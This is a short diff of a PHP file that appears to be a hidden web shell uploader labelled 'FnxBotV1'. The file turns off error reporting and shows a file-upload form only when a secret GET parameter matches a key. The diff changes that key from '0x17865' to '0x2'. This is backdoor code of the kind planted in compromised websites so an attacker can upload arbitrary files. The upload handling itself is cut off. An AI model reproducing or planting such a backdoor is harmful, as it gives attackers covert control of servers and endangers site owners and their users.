@@ -1,6 +1,6 @@
 <?php 
 error_reporting(0);
-if ($_GET["Fnx"] == "0x17865"){
+if ($_GET["Fnx"] == "0x2"){
 echo "<h1>FnxBotV1</h1>";
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
